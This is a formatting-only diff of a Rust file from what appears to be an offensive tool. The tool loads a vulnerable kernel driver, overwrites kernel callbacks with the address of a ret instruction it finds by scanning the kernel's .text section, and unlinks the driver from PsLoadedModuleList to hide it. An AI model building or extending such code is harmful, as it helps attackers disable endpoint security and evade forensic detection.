@@ -20,11 +20,11 @@
 //! - After overwriting, the vulnerable driver is unlinked from
 //!   PsLoadedModuleList for anti-forensic cleanup
 
-use common::lock::MutexExt;
 use super::deploy::{self, DeployedDriver};
 use super::discover::{CallbackInfo, CallbackListType};
 use super::driver_db::VulnerableDriver;
 use anyhow::{bail, Context, Result};
+use common::lock::MutexExt;
 use once_cell::sync::Lazy;
 use serde::{Deserialize, Serialize};
 use std::sync::Mutex;
@@ -323,7 +323,13 @@ fn find_ret_address(
             // Prefer 16-byte aligned offsets (function entry alignment on ARM64).
             for offset in (0..scan_size.saturating_sub(4)).step_by(16) {
                 let off = offset as usize;
-                if u32::from_le_bytes([scan_buf[off], scan_buf[off + 1], scan_buf[off + 2], scan_buf[off + 3]]) == ret_bytes {
+                if u32::from_le_bytes([
+                    scan_buf[off],
+                    scan_buf[off + 1],
+                    scan_buf[off + 2],
+                    scan_buf[off + 3],
+                ]) == ret_bytes
+                {
                     let ret_addr = kernel_base + virtual_address + offset;
                     tracing::info!(
                         "Found ret in .text at offset 0x{:04X}: 0x{:016X}",
@@ -337,7 +343,13 @@ fn find_ret_address(
             // Fallback: scan at 4-byte aligned offsets.
             for offset in (0..scan_size.saturating_sub(4)).step_by(4) {
                 let off = offset as usize;
-                if u32::from_le_bytes([scan_buf[off], scan_buf[off + 1], scan_buf[off + 2], scan_buf[off + 3]]) == ret_bytes {
+                if u32::from_le_bytes([
+                    scan_buf[off],
+                    scan_buf[off + 1],
+                    scan_buf[off + 2],
+                    scan_buf[off + 3],
+                ]) == ret_bytes
+                {
                     let ret_addr = kernel_base + virtual_address + offset;
                     tracing::info!(
                         "Found ret in .text at 4-byte aligned offset 0x{:04X}: 0x{:016X}",
